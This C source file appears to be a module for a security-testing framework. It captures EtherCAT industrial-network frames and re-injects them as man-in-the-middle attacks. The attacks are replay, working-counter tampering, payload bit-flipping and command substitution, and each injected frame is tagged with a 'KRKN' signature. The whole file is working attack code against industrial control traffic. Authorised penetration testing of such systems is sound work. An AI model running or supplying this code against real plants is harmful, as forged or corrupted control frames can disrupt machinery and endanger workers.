
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#include "kraken_module_abi.h"
#include "kraken_module_abi_v2.h"

#define KRAKEN_SIG "KRKN"
#define KRAKEN_SIG_LEN 4

#define MAX_CAPTURED 100

typedef struct {
    uint8_t data[1500];
    size_t len;
} captured_frame_t;

static captured_frame_t captured[MAX_CAPTURED];
static size_t capture_count = 0;

static size_t inject_signature(uint8_t *frame, size_t len) {
    if (len < 14) return 0; 

   
    uint16_t header = frame[0] | (frame[1] << 8);
    uint16_t frame_len = header & 0x7FF;
    uint8_t frame_type = (header >> 12) & 0x0F;

    if (frame_type != 1) return len; 
    if (frame_len < 12) return len;  

   
    uint16_t len_flags = frame[8] | (frame[9] << 8);
    uint16_t data_len = len_flags & 0x7FF;

   
   
    size_t new_len = len + KRAKEN_SIG_LEN;
    if (new_len > 1500) return len; 

   
    memmove(frame + 12 + KRAKEN_SIG_LEN, frame + 12, len - 12);

   
    memcpy(frame + 12, KRAKEN_SIG, KRAKEN_SIG_LEN);

   
    uint16_t new_frame_len = frame_len + KRAKEN_SIG_LEN;
    frame[0] = new_frame_len & 0xFF;
    frame[1] = ((new_frame_len >> 8) & 0x07) | (frame_type << 4);

   
    uint16_t new_data_len = data_len + KRAKEN_SIG_LEN;
    frame[8] = new_data_len & 0xFF;
    frame[9] = (len_flags & 0xF800) | ((new_data_len >> 8) & 0x07);

    return new_len;
}

static int capture_frames(KrakenConnectionHandle conn, const KrakenConnectionOps *ops,
                          KrakenRunResultV2 *result, int duration_ms) {
    capture_count = 0;
    clock_t start = clock();
    clock_t end = start + (duration_ms * CLOCKS_PER_SEC / 1000);

    while (clock() < end && capture_count < MAX_CAPTURED) {
        uint8_t buf[1500];
        int64_t n = ops->recv(conn, buf, sizeof(buf), 50);
        if (n > 16) {
           
           
            uint16_t header = buf[14] | (buf[15] << 8);
            uint8_t frame_type = (header >> 12) & 0x0F;
            if (frame_type == 1) {
                memcpy(captured[capture_count].data, buf, n);
                captured[capture_count].len = n;
                capture_count++;
            }
        }
    }

    char log[128];
    snprintf(log, sizeof(log), "  Captured %zu EtherCAT frames", capture_count);
    add_log_v2(result, log);

    return (int)capture_count;
}

static int test_replay(KrakenConnectionHandle conn, const KrakenConnectionOps *ops,
                       KrakenRunResultV2 *result) {
    if (capture_count == 0) {
        add_log_v2(result, "  Replay: no frames to replay");
        return 0;
    }

    int sent = 0;
    for (size_t i = 0; i < capture_count; i++) {
       
        if (captured[i].len > 14) {
            uint8_t modified[1500];
            size_t ecat_len = captured[i].len - 14;
            memcpy(modified, captured[i].data + 14, ecat_len);

           
            size_t new_len = inject_signature(modified, ecat_len);

            if (ops->send(conn, modified, new_len, 50) > 0) {
                sent++;
            }
        }
    }

    char log[128];
    snprintf(log, sizeof(log), "  Replay: sent %d captured frames", sent);
    add_log_v2(result, log);

    return sent;
}

static int test_modified_wkc(KrakenConnectionHandle conn, const KrakenConnectionOps *ops,
                             KrakenRunResultV2 *result) {
    if (capture_count == 0) {
        add_log_v2(result, "  Modified WKC: no frames");
        return 0;
    }

    int sent = 0;
    for (size_t i = 0; i < capture_count && i < 20; i++) {
        uint8_t modified[1500];
        size_t len = captured[i].len;
        if (len <= 14) continue;

        memcpy(modified, captured[i].data + 14, len - 14);
        size_t ecat_len = len - 14;

       
       
        if (ecat_len > 4) {
            uint16_t header = modified[0] | (modified[1] << 8);
            uint16_t frame_len = header & 0x7FF;
            if (frame_len > 2 && frame_len <= ecat_len - 2) {
               
                modified[frame_len] = 0xFF;
                modified[frame_len + 1] = 0x00;
            }
        }

       
        size_t new_len = inject_signature(modified, ecat_len);

        if (ops->send(conn, modified, new_len, 50) > 0) {
            sent++;
        }
    }

    char log[128];
    snprintf(log, sizeof(log), "  Modified WKC: sent %d frames with altered WKC", sent);
    add_log_v2(result, log);

    return sent;
}

static int test_corrupted_data(KrakenConnectionHandle conn, const KrakenConnectionOps *ops,
                               KrakenRunResultV2 *result) {
    if (capture_count == 0) {
        add_log_v2(result, "  Corrupted data: no frames");
        return 0;
    }

    int sent = 0;
    for (size_t i = 0; i < capture_count && i < 20; i++) {
        uint8_t modified[1500];
        size_t len = captured[i].len;
        if (len <= 14) continue;

        memcpy(modified, captured[i].data + 14, len - 14);
        size_t ecat_len = len - 14;

       
        if (ecat_len > 14) {
            for (size_t j = 12; j < ecat_len - 2 && j < 20; j++) {
                modified[j] ^= 0xAA;
            }
        }

       
        size_t new_len = inject_signature(modified, ecat_len);

        if (ops->send(conn, modified, new_len, 50) > 0) {
            sent++;
        }
    }

    char log[128];
    snprintf(log, sizeof(log), "  Corrupted data: sent %d frames with flipped bits", sent);
    add_log_v2(result, log);

    return sent;
}

static int test_cmd_substitution(KrakenConnectionHandle conn, const KrakenConnectionOps *ops,
                                 KrakenRunResultV2 *result) {
    if (capture_count == 0) {
        add_log_v2(result, "  Cmd substitution: no frames");
        return 0;
    }

    int sent = 0;
    for (size_t i = 0; i < capture_count && i < 20; i++) {
        uint8_t modified[1500];
        size_t len = captured[i].len;
        if (len <= 14) continue;

        memcpy(modified, captured[i].data + 14, len - 14);
        size_t ecat_len = len - 14;

       
        if (ecat_len > 2) {
            uint8_t cmd = modified[2];
           
            if (cmd == 1 || cmd == 4 || cmd == 7 || cmd == 10) {
                modified[2] = cmd + 1;
            }
        }

       
        size_t new_len = inject_signature(modified, ecat_len);

        if (ops->send(conn, modified, new_len, 50) > 0) {
            sent++;
        }
    }

    char log[128];
    snprintf(log, sizeof(log), "  Cmd substitution: sent %d frames with changed commands", sent);
    add_log_v2(result, log);

    return sent;
}

KRAKEN_API int kraken_run_v2(
    KrakenConnectionHandle conn,
    const KrakenConnectionOps *ops,
    const KrakenTarget *target,
    uint32_t timeout_ms,
    const char *params_json,
    KrakenRunResultV2 **out_result
) {
    (void)timeout_ms;
    (void)params_json;

    KrakenRunResultV2 *result = calloc(1, sizeof(KrakenRunResultV2));
    if (!result) return -1;
    copy_target(&result->target, target);

    add_log_v2(result, "Starting EtherCAT MITM tests");

   
    add_log_v2(result, "Phase 1: Capturing traffic (2 seconds)");
    capture_frames(conn, ops, result, 2000);

    int total_sent = 0;

    add_log_v2(result, "Phase 2: Replay attacks");

    add_log_v2(result, "Test 1: Simple replay");
    total_sent += test_replay(conn, ops, result);

    add_log_v2(result, "Test 2: Modified WKC");
    total_sent += test_modified_wkc(conn, ops, result);

    add_log_v2(result, "Test 3: Corrupted data");
    total_sent += test_corrupted_data(conn, ops, result);

    add_log_v2(result, "Test 4: Command substitution");
    total_sent += test_cmd_substitution(conn, ops, result);

    char summary[256];
    snprintf(summary, sizeof(summary), "MITM tests complete. Captured %zu, replayed/modified %d frames",
             capture_count, total_sent);
    add_log_v2(result, summary);

    KrakenFindingV2 finding = {0};
    finding.id = mystrdup("ecat-mitm");
    finding.module_id = mystrdup("ecat_mitm");
    finding.success = (capture_count > 0 && total_sent > 0);
    finding.title = mystrdup("EtherCAT MITM Testing");
    finding.severity = mystrdup(finding.success ? "high" : "info");

    snprintf(summary, sizeof(summary),
             "Captured %zu frames, replayed %d modified. Tests replay, WKC mod, corruption, cmd sub.",
             capture_count, total_sent);
    finding.description = mystrdup(summary);
    finding.timestamp = (int64_t)time(NULL);
    copy_target(&finding.target, target);

    add_finding_v2(result, &finding);

    *out_result = result;
    return 0;
}

KRAKEN_API void kraken_free_v2(void *p) {
    if (!p) return;
    KrakenRunResultV2 *r = (KrakenRunResultV2 *)p;
    for (size_t i = 0; i < r->logs.count; i++)
        free((void *)r->logs.strings[i]);
    free((void *)r->logs.strings);
    for (size_t i = 0; i < r->findings_count; i++) {
        KrakenFindingV2 *f = &r->findings[i];
        free((void *)f->id);
        free((void *)f->module_id);
        free((void *)f->title);
        free((void *)f->severity);
        free((void *)f->description);
        free_target(&f->target);
    }
    free(r->findings);
    free_target(&r->target);
    free(r);
}
